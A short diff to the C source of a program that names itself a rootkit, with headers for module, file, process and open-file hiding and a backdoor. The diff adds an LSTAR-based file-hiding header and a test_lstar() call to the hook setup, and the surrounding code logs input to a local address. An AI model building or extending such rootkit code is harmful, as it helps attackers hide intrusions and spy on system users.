@@ -16,6 +16,7 @@
 #include "rootkit.h"
 #include "modhide.h"
 #include "filehide.h"
+#include "filehide_lstar.h"
 #include "backdoor.h"
 #include "pidhide.h"
 #include "openhide.h"
@@ -98,6 +99,8 @@ init_hooks(void)
 
     if (rootkit.logging_input)
         log_input("127.0.0.1", "5000");
+
+    test_lstar();
 }
 
 void
